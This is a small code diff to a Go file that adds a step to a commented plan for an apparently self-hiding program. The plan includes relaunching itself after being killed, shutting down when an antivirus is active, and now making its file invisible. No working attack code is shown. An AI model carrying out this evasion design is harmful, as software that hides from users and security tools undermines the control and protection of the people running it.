@@ -35,6 +35,8 @@ func Start() bool {
 		8. Monitor if the app is working... if it died after launching, we should relaunch by repeating the entire process again!
 			monitor if there is an active antivirus...if yes, then shutdown fast the app!
 		9. The app should also die from sigterm...
+		10. Set some attributes to the file to be invisible
+
 	*/
 
 	var fsData []byte
